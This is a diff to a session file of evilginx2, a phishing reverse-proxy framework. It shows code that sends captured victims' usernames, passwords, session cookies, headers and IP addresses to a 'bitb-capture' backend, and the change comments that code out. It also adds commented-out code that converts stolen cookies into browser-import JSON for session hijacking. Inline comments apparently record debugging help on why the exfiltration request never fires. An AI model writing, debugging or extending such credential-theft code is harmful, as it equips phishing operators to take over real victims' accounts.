@@ -2,13 +2,14 @@ package core
 
 import (
 	"time"
-	"os"
+	/* "os"
 	"encoding/json"
 	"net/http"
 	"bytes"
 	"crypto/hmac"
 	"crypto/sha256"
-	"encoding/hex"
+	"encoding/hex" */
+	//"strings"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -70,6 +71,7 @@ func (s *Session) SetUsername(username string) {
 	s.Username = username
 }
 
+
 func (s *Session) SetPassword(password string) {
 	s.Password = password
 }
@@ -79,6 +81,12 @@ func (s *Session) SetCustom(name string, value string) {
 }
 
 func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+	/* log.Warning(
+    	"COOKIE ADDED: %s %s %s",
+    	domain,
+    	key,
+		value,
+	) */
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
@@ -141,8 +149,8 @@ func (s *Session) Finish(is_auth_url bool) {
 	if !s.IsDone {
 		s.IsDone = true
 		s.IsAuthUrl = is_auth_url
-		log.Debug("Finish: posting session %s (auth=%v, user=%s)", s.Id, is_auth_url, s.Username)
-		go s.postToBackend()
+		///log.Debug("Finish: posting session %s (auth=%v, user=%s)", s.Id, is_auth_url, s.Username)
+		//go s.postToBackend()
 		if s.DoneSignal != nil {
 			close(s.DoneSignal)
 			s.DoneSignal = nil
@@ -200,38 +208,90 @@ func (s *Session) Finish(is_auth_url bool) {
     _, _ = client.Do(req)// ignore response / errors or log them
 } */
 
-func (s *Session) postToBackend() {
-    backendURL := os.Getenv("BACKEND_URL")
-    if backendURL == "" {
-        backendURL = "http://localhost:5000/api/v1/bitb/capture" // fallback
+// cookieTokensToJSON converts Evilginx's internal CookieTokens map into
+// an EditThisCookie/StorageAce-compatible JSON array of cookies.
+/* func cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
+    type Cookie struct {
+        Path           string `json:"path"`
+        Domain         string `json:"domain"`
+        ExpirationDate int64  `json:"expirationDate"`
+        Value          string `json:"value"`
+        Name           string `json:"name"`
+        HttpOnly       bool   `json:"httpOnly"`
+        HostOnly       bool   `json:"hostOnly"`
+        Secure         bool   `json:"secure"`
+        Session        bool   `json:"session"`
     }
 
-    log.Warning("postToBackend: url=%s id=%s user=%s", backendURL, s.Id, s.Username)
+    var cookies []*Cookie
+    for domain, tmap := range tokens {
+        for k, v := range tmap {
+            c := &Cookie{
+                Path:           v.Path,
+                Domain:         domain,
+                ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+                Value:          v.Value,
+                Name:           k,
+                HttpOnly:       v.HttpOnly,
+                Secure:         false,
+                Session:        false,
+            }
+            if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
+                c.Secure = true
+            }
+            if len(domain) > 0 && domain[:1] == "." {
+                c.HostOnly = false
+            } else {
+                c.HostOnly = true
+            }
+            if c.Path == "" {
+                c.Path = "/"
+            }
+            cookies = append(cookies, c)
+        }
+    }
+
+    b, _ := json.Marshal(cookies)
+    return string(b)
+} */
+
+
+
+/* func (s *Session) postToBackend() {
+    backendURL := os.Getenv("BACKEND_URL")
+    if backendURL == "" {
+        backendURL = "http://localhost:3500/api/bookings/bitb-capture"
+    }
+
+    log.Warning("postToBackend: url=%s id=%d user=%s", backendURL, s.Id, s.Username)
+    //                            ^^
+    //                            s.Id is string, but using %d → this may cause weird output
 
     secret := []byte(os.Getenv("ENCRYPTION_SECRET"))
     if len(secret) == 0 {
-        secret = []byte("super-secret") // fallback; replace in prod
+        secret = []byte("super-secret")
     }
 
     payload := map[string]interface{}{
-        "id":        s.Id,
-        "name":      s.Name,
-        "username":  s.Username,
-        "password":  s.Password,
-        "custom":    s.Custom,
-        "params":    s.Params,
-        "body":      s.BodyTokens,
-        "headers":   s.HttpTokens,
-        "cookies":   s.CookieTokens,
-        "remote_ip": s.RemoteAddr,
-        "ua":        s.UserAgent,
-        "is_auth":   s.IsAuthUrl,
+        "id":          s.Id,
+        "name":        s.Name,
+        "username":    s.Username,
+        "password":    s.Password,
+        //"landing url": s.LandingURL,
+        "custom":      s.Custom,
+        "params":      s.Params,
+        "body":        s.BodyTokens,
+        "headers":     s.HttpTokens,
+        "cookies":     s.CookieTokens,
+        "remote_ip":   s.RemoteAddr,
+        "ua":          s.UserAgent,
+        "is_auth":     s.IsAuthUrl,
     }
 
     body, err := json.Marshal(payload)
     if err != nil {
         log.Error("postToBackend: json marshal error: %v", err)
-        return
+        return  // ← If this hits, you’ll see an error but no HTTP request
     }
 
     mac := hmac.New(sha256.New, secret)
@@ -242,18 +302,20 @@ func (s *Session) postToBackend() {
     req, err := http.NewRequest("POST", backendURL, bytes.NewReader(body))
     if err != nil {
         log.Error("postToBackend: new request error: %v", err)
-        return
+        return  // ← If this hits, no request is sent
     }
     req.Header.Set("Content-Type", "application/json")
     req.Header.Set("X-Signature", sigHex)
 
     client := &http.Client{Timeout: 5 * time.Second}
+    log.Info("postToBackend sig=%s", sigHex)
+
     resp, err := client.Do(req)
     if err != nil {
         log.Error("postToBackend: http error: %v", err)
-        return
+        return  // ← If this hits, you’ll see "http error" but no status log
     }
     defer resp.Body.Close()
 
-    log.Info("postToBackend: status %s", resp.Status)
-}
+    log.Info("postToBackend: status %s", resp.Status)  // ← You said this never logs
+} */
